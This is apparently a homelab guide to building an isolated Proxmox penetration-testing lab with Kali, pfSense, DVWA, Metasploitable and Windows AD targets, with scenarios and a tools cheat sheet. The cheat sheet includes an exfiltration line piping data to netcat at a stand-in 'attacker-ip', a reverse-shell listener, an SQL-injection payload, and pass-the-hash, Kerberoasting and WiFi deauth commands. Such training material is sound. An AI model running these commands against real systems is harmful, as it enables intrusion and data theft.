# Security Lab (Isolated Environment)

## Overview

Isolated penetration testing and security research environment for learning ethical hacking, vulnerability assessment, network security, and defensive security practices.

## Infrastructure Type

**Virtual Machines** - Full OS isolation required for security tools and vulnerable targets

## Network Architecture

**Isolated VLAN** - Completely separated from production networks for safety

```
┌─────────────────────────────────────────────────────────┐
│             Isolated Security VLAN (10.10.10.0/24)     │
│                                                          │
│  ┌──────────────┐    ┌──────────────┐   ┌────────────┐│
│  │   Kali Linux │───▶│  pfSense/    │───│ Vulnerable ││
│  │   (Attacker) │    │  OPNsense    │   │  Targets   ││
│  │  10.10.10.10 │    │  (Firewall)  │   │ 10.10.10.x ││
│  └──────────────┘    │  10.10.10.1  │   └────────────┘│
│                       └──────────────┘                  │
│                              │                          │
│                       (NAT/Routing)                     │
│                              │                          │
└──────────────────────────────┼──────────────────────────┘
                               │
                        (Optional bridge to main network)
```

## Components

### 1. Kali Linux (Attack Platform)
- **Purpose:** Penetration testing and security auditing
- **RAM:** 4GB
- **vCPU:** 4 cores
- **Storage:** 50GB
- **Tools:** Metasploit, Burp Suite, Nmap, Wireshark, john, hashcat

### 2. pfSense/OPNsense (Firewall/Router)
- **Purpose:** Network segmentation, traffic monitoring, IDS/IPS practice
- **RAM:** 2GB
- **vCPU:** 2 cores
- **Storage:** 20GB
- **Features:** Firewall rules, VPN, Snort/Suricata IDS

### 3. Vulnerable Targets (Practice Environments)
- **DVWA** (Damn Vulnerable Web Application)
- **Metasploitable 2/3** (Intentionally vulnerable Linux)
- **VulnHub VMs** (Various difficulty levels)
- **HackTheBox-style targets**
- **Windows Server** (Active Directory pentesting)

## Total Resource Allocation

- **RAM:** 4-6GB total
- **vCPU:** 6-8 cores total
- **Storage:** 100-150GB total

## Implementation Steps

### 1. Create Isolated VLAN on Proxmox

```bash
# Create Linux Bridge for security lab
# Edit /etc/network/interfaces
auto vmbr1
iface vmbr1 inet static
    address 10.10.10.1
    netmask 255.255.255.0
    bridge-ports none
    bridge-stp off
    bridge-fd 0
    # No physical port attached - fully isolated

# Restart networking
systemctl restart networking
```

### 2. Deploy pfSense/OPNsense VM

```bash
# Create VM
qm create 501 --name pfsense \
  --memory 2048 \
  --cores 2 \
  --net0 virtio,bridge=vmbr0 \  # WAN interface (optional)
  --net1 virtio,bridge=vmbr1    # LAN interface (security lab)

# Download and attach pfSense ISO
wget https://sgpfiles.netgate.com/mirror/downloads/pfSense-CE-2.7.2-RELEASE-amd64.iso.gz
gunzip pfSense-CE-2.7.2-RELEASE-amd64.iso.gz
qm set 501 --ide2 /var/lib/vz/template/iso/pfSense-CE-2.7.2-RELEASE-amd64.iso,media=cdrom

# Start VM and install
qm start 501
```

**pfSense Initial Configuration:**
- WAN: DHCP or static (optional, for internet access)
- LAN: 10.10.10.1/24
- Enable DHCP server on LAN (10.10.10.50-10.10.10.200)
- Configure firewall rules (allow all on LAN for lab purposes)

### 3. Deploy Kali Linux

```bash
# Create VM
qm create 502 --name kali-linux \
  --memory 4096 \
  --cores 4 \
  --net0 virtio,bridge=vmbr1 \  # Connected to security VLAN
  --scsihw virtio-scsi-pci \
  --scsi0 local-lvm:50

# Download Kali Linux
wget https://cdimage.kali.org/kali-2024.1/kali-linux-2024.1-installer-amd64.iso

# Attach ISO and install
qm set 502 --ide2 /var/lib/vz/template/iso/kali-linux-2024.1-installer-amd64.iso,media=cdrom
qm start 502
```

**Kali Configuration:**
```bash
# After installation, update Kali
sudo apt update && sudo apt upgrade -y

# Install additional tools
sudo apt install -y \
  metasploit-framework \
  burpsuite \
  zaproxy \
  sqlmap \
  nikto \
  dirb \
  gobuster \
  hydra \
  john \
  hashcat \
  exploitdb \
  wordlists

# Update Metasploit database
sudo msfdb init

# Extract SecLists wordlists
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

### 4. Deploy Vulnerable Targets

#### A. DVWA (Docker-based)

```bash
# Create Ubuntu VM
qm create 503 --name dvwa \
  --memory 1024 \
  --cores 1 \
  --net0 virtio,bridge=vmbr1

# Install Docker and run DVWA
docker run -d -p 80:80 vulnerables/web-dvwa
```

#### B. Metasploitable 2

```bash
# Download Metasploitable
wget https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip

# Extract and import to Proxmox
unzip metasploitable-linux-2.0.0.zip
qm importdisk 504 metasploitable.vmdk local-lvm
qm set 504 --scsi0 local-lvm:vm-504-disk-0
qm set 504 --name metasploitable2 --memory 512 --cores 1 --net0 virtio,bridge=vmbr1
```

#### C. VulnHub VMs

```bash
# Download various VulnHub machines
# Example: Basic Pentesting 1
wget https://download.vulnhub.com/basicpentesting/BasicPentestingJB.ova

# Convert OVA to Proxmox
qm importovf 505 BasicPentestingJB.ova local-lvm
```

#### D. Windows Active Directory Lab

```bash
# Create Windows Server 2019 VM (Domain Controller)
qm create 506 --name dc01 \
  --memory 4096 \
  --cores 2 \
  --net0 virtio,bridge=vmbr1

# Create Windows 10 Client VMs
qm create 507 --name win10-client01 \
  --memory 2048 \
  --cores 2 \
  --net0 virtio,bridge=vmbr1
```

## Security Lab Scenarios

### 1. Web Application Penetration Testing

**Target:** DVWA
**Skills:** SQL injection, XSS, CSRF, file upload, command injection

```bash
# From Kali Linux
# Start Burp Suite
burpsuite &

# Scan for vulnerabilities
nikto -h http://10.10.10.100

# Directory brute-force
gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirb/common.txt

# SQL injection with sqlmap
sqlmap -u "http://10.10.10.100/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=xxx" --dbs
```

### 2. Network Penetration Testing

**Target:** Metasploitable 2
**Skills:** Port scanning, vulnerability scanning, exploitation

```bash
# Network discovery
nmap -sn 10.10.10.0/24

# Port scanning
nmap -sV -sC -p- 10.10.10.101

# Vulnerability scanning
nmap --script vuln 10.10.10.101

# Exploit with Metasploit
msfconsole
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 10.10.10.101
msf6 > exploit
```

### 3. Active Directory Exploitation

**Target:** Windows AD Lab
**Skills:** Kerberoasting, pass-the-hash, privilege escalation

```bash
# Enumerate domain
nmap -p 88,135,139,389,445,636,3268,3269 10.10.10.102

# SMB enumeration
enum4linux -a 10.10.10.102
smbclient -L //10.10.10.102 -N

# Kerberoasting
impacket-GetUserSPNs domain.local/user:password -dc-ip 10.10.10.102 -request

# Pass-the-hash
impacket-psexec administrator@10.10.10.102 -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

### 4. Wireless Security (with USB WiFi adapter passthrough)

```bash
# Enable monitor mode
airmon-ng start wlan0

# Capture handshakes
airodump-ng wlan0mon

# Deauth attack
aireplay-ng --deauth 10 -a <BSSID> wlan0mon

# Crack WPA/WPA2
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap
```

### 5. Password Cracking

```bash
# Hash identification
hashid '$1$Zzz...'

# Crack with John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Crack with hashcat (GPU accelerated)
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

### 6. Traffic Analysis & Sniffing

```bash
# Start Wireshark
wireshark &

# Capture traffic with tcpdump
tcpdump -i eth0 -w capture.pcap

# Analyze HTTP traffic
tshark -r capture.pcap -Y http.request -T fields -e http.host -e http.request.uri

# Extract files from pcap
foremost -i capture.pcap -o extracted/
```

### 7. IDS/IPS Testing

**Configure Snort on pfSense:**
```bash
# Install Snort package in pfSense
# Configure rules for ICMP, port scans, SQL injection

# Test IDS from Kali
# Port scan trigger
nmap -sS -T4 10.10.10.1

# SQL injection trigger
sqlmap -u "http://target/page?id=1"

# Check Snort alerts in pfSense
```

## Security Tools Cheat Sheet

### Reconnaissance
```bash
# Passive reconnaissance
whois domain.com
dig domain.com
theHarvester -d domain.com -b google

# Active reconnaissance
nmap -sV -O 10.10.10.0/24
masscan -p1-65535 10.10.10.0/24 --rate=1000
```

### Exploitation
```bash
# Metasploit
msfconsole
search <vulnerability>
use <exploit>
set RHOSTS <target>
exploit

# Manual exploitation
searchsploit apache 2.4.49
nc -lvnp 4444  # Start listener
```

### Post-Exploitation
```bash
# Privilege escalation
linpeas.sh  # Linux
winpeas.exe  # Windows

# Persistence
crontab -e  # Linux
schtasks  # Windows

# Data exfiltration
tar -czf - /data | nc attacker-ip 9999
```

### Web Application Testing
```bash
# Automated scanners
nikto -h http://target
zaproxy  # OWASP ZAP

# Manual testing
burpsuite
curl -X POST http://target -d "username=admin' OR '1'='1"
```

## Learning Resources & Certifications

### Practice Platforms
- **TryHackMe** - Guided learning paths
- **HackTheBox** - Realistic challenges
- **PentesterLab** - Web pentesting
- **PortSwigger Web Security Academy** - Free web hacking labs
- **VulnHub** - Downloadable vulnerable VMs

### Certifications
- **OSCP** (Offensive Security Certified Professional)
- **CEH** (Certified Ethical Hacker)
- **eJPT** (eLearnSecurity Junior Penetration Tester)
- **PNPT** (Practical Network Penetration Tester)

## Defensive Security Practice

### Blue Team Skills

#### 1. Log Analysis
```bash
# Analyze logs for suspicious activity
grep "Failed password" /var/log/auth.log
grep "404" /var/log/apache2/access.log | sort | uniq -c | sort -rn
```

#### 2. Incident Response
```bash
# Check for rootkits
rkhunter --check
chkrootkit

# Find recently modified files
find / -mtime -1 -type f

# Check listening ports
netstat -tulpn
ss -tulpn
```

#### 3. Hardening
```bash
# Disable unnecessary services
systemctl disable <service>

# Configure firewall
ufw enable
ufw default deny incoming
ufw allow ssh

# Update systems
apt update && apt upgrade -y
```

## Network Monitoring with pfSense

### Configure Snort IDS

```bash
# In pfSense web UI:
# 1. System > Package Manager > Install Snort
# 2. Services > Snort > Global Settings
# 3. Enable Snort on LAN interface
# 4. Configure rule sets (ET Open, Snort VRT)
# 5. View alerts in Services > Snort > Alerts
```

### Traffic Shaping & QoS

```bash
# Test bandwidth throttling
# In pfSense: Firewall > Traffic Shaper
# Create limiters for different attack scenarios
```

## Capture The Flag (CTF) Setup

### Build Custom CTF Challenges

```bash
# Create custom vulnerable app
docker run -d -p 8080:80 --name ctf-challenge \
  -e FLAG="flag{this_is_a_secret}" \
  custom-ctf-image
```

### CTF Frameworks
- **CTFd** - Open-source CTF platform
- **picoCTF** - Education-focused platform
- **Facebook CTF** - King-of-the-hill style

## Safety & Legal Considerations

### Ethical Guidelines

1. **Never attack systems you don't own or have permission to test**
2. **Keep the lab isolated** - No bridge to production networks
3. **Document all activities** - Maintain testing logs
4. **Stay updated on laws** - Computer Fraud and Abuse Act (CFAA), etc.
5. **Responsible disclosure** - Report vulnerabilities ethically

### Lab Safety Checklist

- [ ] VLAN is fully isolated from production
- [ ] Firewall rules prevent outbound attacks
- [ ] No sensitive data stored in lab environment
- [ ] Regular snapshots of VMs for recovery
- [ ] Clear labeling of vulnerable systems
- [ ] Access restricted to authorized users

## Backup & Snapshots

```bash
# Create VM snapshot before testing
qm snapshot 502 before-exploit

# Restore snapshot
qm rollback 502 before-exploit

# Clone VM for different scenarios
qm clone 503 603 --name dvwa-advanced
```

## Automation & Scripting

### Automated Scanning Script

```bash
#!/bin/bash
# auto_scan.sh

TARGET=$1
OUTPUT_DIR="scan_results_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT_DIR

# Nmap scan
echo "[*] Running Nmap scan..."
nmap -sV -sC -oN $OUTPUT_DIR/nmap.txt $TARGET

# Nikto scan
echo "[*] Running Nikto scan..."
nikto -h http://$TARGET -o $OUTPUT_DIR/nikto.txt

# Gobuster
echo "[*] Running directory enumeration..."
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -o $OUTPUT_DIR/gobuster.txt

echo "[*] Scan complete. Results in $OUTPUT_DIR/"
```

## Performance Optimization

- **Disable GUI on Kali** - Run headless, use SSH with X forwarding
- **Use lightweight targets** - Docker containers instead of full VMs
- **Pause unused VMs** - Only run what you're actively testing
- **Storage optimization** - Use thin provisioning for VM disks

## Monitoring & Logging

```bash
# Central logging server
# Install ELK stack (Elasticsearch, Logstash, Kibana)
# Send pfSense, Kali, and target logs to centralized location

# Real-time monitoring
tail -f /var/log/snort/alert
```

## Next Steps

1. Create isolated VLAN on Proxmox
2. Deploy pfSense firewall for network segmentation
3. Install Kali Linux as attack platform
4. Deploy vulnerable targets (DVWA, Metasploitable)
5. Practice reconnaissance and exploitation
6. Configure Snort IDS for detection practice
7. Build Windows AD lab for enterprise testing
8. Participate in CTF competitions
9. Work toward security certifications

---

**Related Projects:**
- [K8s Platform](./02-k8s-platform.md) - Practice Kubernetes security
- [CI/CD Platform](./01-cicd-platform.md) - Secure CI/CD pipeline configuration
- [DB Cluster](./03-db-cluster.md) - Database security hardening

**WARNING:** This lab is for **educational and authorized testing only**. Always obtain proper authorization before conducting security assessments.
